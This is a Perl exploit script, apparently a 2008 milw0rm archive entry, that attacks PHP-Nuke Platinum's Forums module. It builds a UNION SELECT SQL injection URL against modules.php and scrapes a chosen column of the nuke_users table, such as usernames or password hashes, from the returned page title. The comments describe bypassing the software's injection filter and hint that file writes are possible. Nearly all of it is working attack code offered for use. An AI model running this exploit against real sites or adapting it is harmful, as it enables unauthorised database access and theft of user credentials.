#!/usr/bin/perl
#Inphex
use LWP::UserAgent;
use LWP::Simple;
use IO::Socket;
use Switch;
#PHP-Nuke Platinum , Forums(Standart) - magic_quotes_gpc = OFF , SQL Injection
#nuke_users Structure:
#user_id 	name 	username 	user_email 	femail 	user_website 	user_avatar 	user_regdate 	user_icq 	user_occ 	user_from 	user_interests 	user_sig 	user_viewemail 	user_theme 	user_aim 	user_yim 	user_msnm 	user_password 	storynum 	umode 	uorder 	thold 	noscore 	bio 	ublockon 	ublock 	theme 	commentmax 	counter 	newsletter 	user_posts 	user_attachsig 	user_rank 	user_level 	broadcast 	popmeson 	user_active 	user_session_time 	user_session_page 	user_lastvisit 	user_timezone 	user_style 	user_lang 	user_dateformatuser_new_privmsg 	user_unread_privmsg 	user_last_privmsg 	user_emailtime 	user_allowhtml 	user_allowbbcode 	user_allowsmile 	user_allowavatar 	user_allow_pm 	user_allow_viewonline 	user_notify 	user_notify_pm 	user_popup_pm 	user_avatar_type 	user_sig_bbcode_uid user_actkey 	user_newpasswd 	last_ip 	user_color_gc 	user_color_gi 	user_quickreply 	user_allow_arcadepm 	kick_ban 	user_wordwrap 	agreedtos 	user_view_log 	user_effects 	user_privs 	user_custitle 	user_specmsg 	user_items 	user_trade 	points 	user_cash 	last_seen_blocker 	user_login_tries 	user_last_login_try 	user_gender 	user_birthday 	user_next_birthday_greeting
#Description:
#The file includes/dynamic_titles.php is vulnerable to SQL Injection - lines:  44 - 427
#What about PHP-Nukes' SQL Injection Protection?
#I could bypass its SQL Injection protection.
#If the file maintenance/index.php is on the server you can see if magic_quotes_gpc are turned off.
#You can of course edit the SQL Injection , file write is possible.
#
#Note: PHP-Nuke Platinum is very buggy,there are more bugs for sure(e.g. includes/nsbypass.php)
print "usage $0 -h localhost -p / -t nuke_users -c username -id 2\n\n";
$column = "username";
$table  = "nuke_users";
$uid    = 2;
%cm_n_ = ("-h" => "host","-p" => "path","-c" => "column","-t" => "table","-id" => "uid");

$a = 0;
foreach  (@ARGV) {
	$a++;
	while (($k, $v) = each(%cm_n_)) {
		if ($_ eq $k) {
			${$v} = $ARGV[$a];
		}
	}
}
&getit("http://".$host.$path."modules.php?name=Forums&p=-1'union+select-1,".$column."+from+".$table."+where+user_id='".$uid."","<title>(.*?)<\/title>");
sub getit($$)
{
	$url = shift;
	$reg = shift;


	$ua = LWP::UserAgent->new;
    $urls = $url;
    $response = $ua->get($urls);
    $content = $response->content;

	if ($content=~m/$reg/) {
	    ($f,$s,$l) = split(">>",$1);
	    $s =~s/ Post //;
	    print $column.":".$s."\n";
	}
}

# milw0rm.com [2008-03-22]
